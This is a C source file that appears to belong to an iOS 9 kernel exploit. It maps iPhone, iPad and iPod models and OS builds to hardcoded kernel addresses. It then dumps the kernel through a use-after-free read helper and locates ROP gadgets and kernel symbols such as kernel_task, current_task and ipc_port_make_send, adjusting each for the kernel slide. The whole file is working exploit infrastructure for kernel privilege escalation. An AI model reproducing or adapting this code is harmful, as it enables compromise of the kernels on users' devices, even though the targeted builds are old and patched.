#include <errno.h>              // errno
#include <stdbool.h>            // bool, true, false
#include <stdint.h>             // uint32_t
#include <stdio.h>              // FILE, asprintf, fopen, fclose, fscanf
#include <stdlib.h>             // free
#include <string.h>             // memcpy, strncmp, strerror
#include <sys/sysctl.h>         // CTL_*, KERN_OSVERSION, HW_MODEL, sysctl

#include "common.h"             // DEBUG, addr_t
#include "find.h"               // find_all_offsets
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW, TRY, FINALLY
#include "uaf_read.h"           // uaf_dump_kernel

#include "offsets.h"

#define CACHE_VERSION 1
offsets_t offsets;
static addr_t anchor = 0,
              vtab   = 0;
static bool initialized = false;

enum
{
    M_N94AP  = 0x0000,      // iPhone 4s
    M_N41AP  = 0x0001,      // iPhone 5
    M_N42AP  = 0x0002,      // iPhone 5
    M_N48AP  = 0x0003,      // iPhone 5c
    M_N49AP  = 0x0004,      // iPhone 5c
    M_N51AP  = 0x0005,      // iPhone 5s
    M_N53AP  = 0x0006,      // iPhone 5s
    M_N61AP  = 0x0007,      // iPhone 6
    M_N56AP  = 0x0008,      // iPhone 6+
    M_N71AP  = 0x0009,      // iPhone 6s
    M_N71mAP = 0x000a,      // iPhone 6s
    M_N66AP  = 0x000b,      // iPhone 6s+
    M_N66mAP = 0x000c,      // iPhone 6s+
    M_N69AP  = 0x000d,      // iPhone SE
    M_N69uAP = 0x000e,      // iPhone SE

    M_N78AP  = 0x000f,      // iPod touch 5G
    M_N78aAP = 0x0010,      // iPod touch 5G
    M_N102AP = 0x0011,      // iPod touch 6G

    M_K93AP  = 0x0012,      // iPad 2
    M_K94AP  = 0x0013,      // iPad 2
    M_K95AP  = 0x0014,      // iPad 2
    M_K93AAP = 0x0015,      // iPad 2
    M_J1AP   = 0x0016,      // iPad 3
    M_J2AP   = 0x0017,      // iPad 3
    M_J2AAP  = 0x0018,      // iPad 3
    M_P101AP = 0x0019,      // iPad 4
    M_P102AP = 0x001a,      // iPad 4
    M_P103AP = 0x001b,      // iPad 4
    M_J71AP  = 0x001c,      // iPad Air
    M_J72AP  = 0x001d,      // iPad Air
    M_J73AP  = 0x001e,      // iPad Air
    M_J81AP  = 0x001f,      // iPad Air 2
    M_J82AP  = 0x0020,      // iPad Air 2
    M_J98aAP = 0x0021,      // iPad Pro (12.9)
    M_J99aAP = 0x0022,      // iPad Pro (12.9)
    M_J127AP = 0x0023,      // iPad Pro (9.7)
    M_J128AP = 0x0024,      // iPad Pro (9.7)

    M_P105AP = 0x0025,      // iPad Mini
    M_P106AP = 0x0026,      // iPad Mini
    M_P107AP = 0x0027,      // iPad Mini
    M_J85AP  = 0x0028,      // iPad Mini 2
    M_J86AP  = 0x0029,      // iPad Mini 2
    M_J87AP  = 0x002a,      // iPad Mini 2
    M_J85mAP = 0x002b,      // iPad Mini 3
    M_J86mAP = 0x002c,      // iPad Mini 3
    M_J87mAP = 0x002d,      // iPad Mini 3
    M_J96AP  = 0x002e,      // iPad Mini 4
    M_J97AP  = 0x002f,      // iPad Mini 4
};

enum
{
    V_13A340 = 0x00000000,  // 9.0
    V_13A342 = 0x00010000,  // 9.0
    V_13A343 = 0x00020000,  // 9.0
    V_13A344 = 0x00030000,  // 9.0
    V_13A404 = 0x00040000,  // 9.0.1
    V_13A405 = 0x00050000,  // 9.0.1
    V_13A452 = 0x00060000,  // 9.0.2
    V_13B138 = 0x00070000,  // 9.1
    V_13B143 = 0x00080000,  // 9.1
    V_13B144 = 0x00090000,  // 9.1
    V_13C75  = 0x000a0000,  // 9.2
    V_13D15  = 0x000b0000,  // 9.2.1
    V_13D20  = 0x000c0000,  // 9.2.1
    V_13E233 = 0x000d0000,  // 9.3
    V_13E234 = 0x000e0000,  // 9.3
    V_13E236 = 0x000f0000,  // 9.3
    V_13E237 = 0x00100000,  // 9.3
    V_13E238 = 0x00110000,  // 9.3.1
    V_13F69  = 0x00120000,  // 9.3.2
    V_13F72  = 0x00130000,  // 9.3.2
    V_13G34  = 0x00140000,  // 9.3.3
    V_13G35  = 0x00150000,  // 9.3.4
};

#define MODEL(name) \
do \
{ \
    if(strncmp(#name, b, s) == 0) return M_##name; \
} while(0)

#define VERSION(name) \
do \
{ \
    if(strncmp(#name, b, s) == 0) return V_##name; \
} while(0)

static uint32_t get_model(void)
{
    // Static so we can use it in THROW
    static char b[32];
    size_t s = sizeof(b);
    // sysctl("hw.model")
    int cmd[2] = { CTL_HW, HW_MODEL };
    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) != 0)
    {
        THROW("sysctl(\"hw.model\") failed: %s", strerror(errno));
    }
    DEBUG("Model: %s", b);

    MODEL(N94AP);
    MODEL(N41AP);
    MODEL(N42AP);
    MODEL(N48AP);
    MODEL(N49AP);
    MODEL(N51AP);
    MODEL(N53AP);
    MODEL(N61AP);
    MODEL(N56AP);
    MODEL(N71AP);
    MODEL(N71mAP);
    MODEL(N66AP);
    MODEL(N66mAP);
    MODEL(N69AP);
    MODEL(N69uAP);

    MODEL(N78AP);
    MODEL(N78aAP);
    MODEL(N102AP);

    MODEL(K93AP);
    MODEL(K94AP);
    MODEL(K95AP);
    MODEL(K93AAP);
    MODEL(J1AP);
    MODEL(J2AP);
    MODEL(J2AAP);
    MODEL(P101AP);
    MODEL(P102AP);
    MODEL(P103AP);
    MODEL(J71AP);
    MODEL(J72AP);
    MODEL(J73AP);
    MODEL(J81AP);
    MODEL(J82AP);
    MODEL(J98aAP);
    MODEL(J99aAP);
    MODEL(J127AP);
    MODEL(J128AP);

    MODEL(P105AP);
    MODEL(P106AP);
    MODEL(P107AP);
    MODEL(J85AP);
    MODEL(J86AP);
    MODEL(J87AP);
    MODEL(J85mAP);
    MODEL(J86mAP);
    MODEL(J87mAP);
    MODEL(J96AP);
    MODEL(J97AP);

    THROW("Unrecognized device: %s", b);
}

static uint32_t get_os_version(void)
{
    // Static so we can use it in THROW
    static char b[32];
    size_t s = sizeof(b);
    // sysctl("kern.osversion")
    int cmd[2] = { CTL_KERN, KERN_OSVERSION };
    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) != 0)
    {
        THROW("sysctl(\"kern.osversion\") failed: %s", strerror(errno));
    }
    DEBUG("OS build: %s", b);

    VERSION(13A340);
    VERSION(13A342);
    VERSION(13A343);
    VERSION(13A344);
    VERSION(13A404);
    VERSION(13A405);
    VERSION(13A452);
    VERSION(13B138);
    VERSION(13B143);
    VERSION(13B144);
    VERSION(13C75);
    VERSION(13D15);
    VERSION(13D20);
    VERSION(13E233);
    VERSION(13E234);
    VERSION(13E236);
    VERSION(13E237);
    VERSION(13E238);
    VERSION(13F69);
    VERSION(13F72);
    VERSION(13G34);
    VERSION(13G35);

    THROW("Unrecognized OS version: %s", b);
}

static addr_t reg_anchor(void)
{
    DEBUG("Getting anchor address from registry...");
    switch(get_model() | get_os_version())
    {
#ifdef __LP64__
        case M_N69AP  | V_13G34:
        case M_N71AP  | V_13G34:
            return 0xffffff8004536000;
        case M_N102AP | V_13C75:
            return 0xffffff800453a000;
#else
        case M_N78AP  | V_13B143:
        case M_N78aAP | V_13B143:
            return 0x800a7b93;
        case M_N78AP  | V_13F69:
        case M_N78aAP | V_13F69:
            return 0x800a744b;
#endif
        default: THROW("Unsupported device/OS combination");
    }
}

static addr_t reg_vtab(void)
{
    DEBUG("Getting OSString vtab address from registry...");
    switch(get_model() | get_os_version())
    {
#ifdef __LP64__
        case M_N69AP  | V_13G34:
        case M_N71AP  | V_13G34:
            return 0xffffff80044ef1f0;
        case M_N102AP | V_13C75:
            return 0xffffff80044f3168;
#else
        case M_N78AP  | V_13B143:
        case M_N78aAP | V_13B143:
            return 0x803eee50;
        case M_N78AP  | V_13F69:
        case M_N78aAP | V_13F69:
            return 0x803ece94;
#endif
        default: THROW("Unsupported device/OS combination");
    }
}

addr_t off_anchor(void)
{
    if(anchor == 0)
    {
        anchor = reg_anchor();
        DEBUG("Got anchor: " ADDR, anchor);
    }
    return anchor;
}

addr_t off_vtab(void)
{
    if(vtab == 0)
    {
        vtab = reg_vtab();
        DEBUG("Got vtab (unslid): " ADDR, vtab);
        vtab += get_kernel_slide();
    }
    return vtab;
}

void off_cfg(const char *dir)
{
    char *cfg_file;
    asprintf(&cfg_file, "%s/config.txt",  dir);
    if(cfg_file == NULL)
    {
        THROW("Failed to allocate string buffer");
    }
    else
    {
        TRY
        ({
            DEBUG("Checking for config file...");
            FILE *f_cfg = fopen(cfg_file, "r");
            if(f_cfg == NULL)
            {
                DEBUG("Nope, let's hope the registry has a compatible anchor & vtab...");
            }
            else
            {
                TRY
                ({
                    DEBUG("Yes, attempting to read anchor and vtab from config file...");
                    // Can't use initializer list because TRY macro
                    addr_t a;
                    addr_t v;
                    if(fscanf(f_cfg, ADDR_IN "\n" ADDR_IN, &a, &v) == 0)
                    {
                        DEBUG("Anchor: " ADDR ", Vtab: " ADDR, a, v);
                        anchor = a;
                        vtab   = v;
                    }
                    else
                    {
                        THROW("Failed to parse config file. Please either repair or remove it.");
                    }
                })
                FINALLY
                ({
                    fclose(f_cfg);
                })
            }
        })
        FINALLY
        ({
            free(cfg_file);
        })
    }
}

void off_init(const char *dir)
{
    if(!initialized)
    {
        DEBUG("Initializing offsets...");
        char *offsets_file,
             *kernel_file;

        asprintf(&offsets_file, "%s/offsets.dat", dir);
        asprintf(&kernel_file,  "%s/kernel.bin",  dir);
        TRY
        ({
            if(offsets_file == NULL || kernel_file == NULL)
            {
                THROW("Failed to allocate string buffers");
            }

            DEBUG("Checking for offsets cache file...");
            FILE *f_off = fopen(offsets_file, "rb");
            if(f_off != NULL)
            {
                TRY
                ({
                    DEBUG("Yes, trying to load offsets from cache...");
                    addr_t version;
                    if(fread(&version, sizeof(version), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read cache file version.");
                    }
                    else if(version != CACHE_VERSION)
                    {
                        DEBUG("Cache is outdated, discarding.");
                    }
                    else if(fread(&offsets, sizeof(offsets), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read offsets from cache file.");
                    }
                    else
                    {
                        initialized = true;
                        DEBUG("Successfully loaded offsets from cache, skipping kernel dumping.");

                        size_t kslide = get_kernel_slide();
                        addr_t *slid = (addr_t*)&offsets.slid;
                        for(size_t i = 0; i < sizeof(offsets.slid) / sizeof(addr_t); ++i)
                        {
                            slid[i] += kslide;
                        }
                    }
                })
                FINALLY
                ({
                    fclose(f_off);
                })
            }

            if(!initialized)
            {
                DEBUG("No offsets loaded so far, dumping the kernel...");
                file_t kernel;
                uaf_dump_kernel(&kernel);
                TRY
                ({
                    // Save dumped kernel to file
                    FILE *f_kernel = fopen(kernel_file, "wb");
                    if(f_kernel == NULL)
                    {
                        WARN("Failed to create kernel file (%s)", strerror(errno));
                    }
                    else
                    {
                        fwrite(kernel.buf, 1, kernel.len, f_kernel);
                        fclose(f_kernel);
                        DEBUG("Wrote dumped kernel to %s", kernel_file);
                    }

                    // Find offsets
                    find_all_offsets(&kernel, &offsets);

                    // Create an unslid copy
                    size_t kslide = get_kernel_slide();
                    offsets_t copy;
                    memcpy(&copy, &offsets, sizeof(copy));
                    addr_t *slid = (addr_t*)&copy.slid;
                    for(size_t i = 0; i < sizeof(copy.slid) / sizeof(addr_t); ++i)
                    {
                        slid[i] -= kslide;
                    }

                    // Write unslid offsets to file
                    FILE *f_off = fopen(offsets_file, "wb");
                    if(f_off == NULL)
                    {
                        WARN("Failed to create offsets cache file (%s)", strerror(errno));
                    }
                    else
                    {
                        addr_t version = CACHE_VERSION;
                        fwrite(&version, sizeof(version), 1, f_off);
                        fwrite(&copy, sizeof(copy), 1, f_off);
                        fclose(f_off);
                        DEBUG("Wrote offsets to %s", offsets_file);
                    }
                })
                FINALLY
                ({
                    free(kernel.buf);
                })
            }

            DEBUG("Offsets:");
            DEBUG("gadget_load_x20_x19                = " ADDR, offsets.slid.gadget_load_x20_x19);
            DEBUG("gadget_ldp_x9_add_sp_sp_0x10       = " ADDR, offsets.slid.gadget_ldp_x9_add_sp_sp_0x10);
            DEBUG("gadget_ldr_x0_sp_0x20_load_x22_x19 = " ADDR, offsets.slid.gadget_ldr_x0_sp_0x20_load_x22_x19);
            DEBUG("gadget_add_x0_x0_x19_load_x20_x19  = " ADDR, offsets.slid.gadget_add_x0_x0_x19_load_x20_x19);
            DEBUG("gadget_blr_x20_load_x22_x19        = " ADDR, offsets.slid.gadget_blr_x20_load_x22_x19);
            DEBUG("gadget_str_x0_x19_load_x20_x19     = " ADDR, offsets.slid.gadget_str_x0_x19_load_x20_x19);
            DEBUG("gadget_ldr_x0_x21_load_x24_x19     = " ADDR, offsets.slid.gadget_ldr_x0_x21_load_x24_x19);
            DEBUG("gadget_OSUnserializeXML_return     = " ADDR, offsets.slid.gadget_OSUnserializeXML_return);
            DEBUG("frag_mov_x1_x20_blr_x19            = " ADDR, offsets.slid.frag_mov_x1_x20_blr_x19);
            DEBUG("func_ldr_x0_x0                     = " ADDR, offsets.slid.func_ldr_x0_x0);
            DEBUG("func_current_task                  = " ADDR, offsets.slid.func_current_task);
            DEBUG("func_ipc_port_copyout_send         = " ADDR, offsets.slid.func_ipc_port_copyout_send);
            DEBUG("func_ipc_port_make_send            = " ADDR, offsets.slid.func_ipc_port_make_send);
            DEBUG("data_kernel_task                   = " ADDR, offsets.slid.data_kernel_task);
            DEBUG("data_realhost_special              = " ADDR, offsets.slid.data_realhost_special);
            DEBUG("off_task_itk_self                  = " ADDR, offsets.unslid.off_task_itk_self);
            DEBUG("off_task_itk_space                 = " ADDR, offsets.unslid.off_task_itk_space);
            DEBUG("OSUnserializeXML_stack             = " ADDR, offsets.unslid.OSUnserializeXML_stack);
            DEBUG("is_io_service_open_extended_stack  = " ADDR, offsets.unslid.is_io_service_open_extended_stack);
        })
        FINALLY
        ({
            if(offsets_file != NULL) free(offsets_file);
            if(kernel_file  != NULL) free(kernel_file);
        })
    }
}
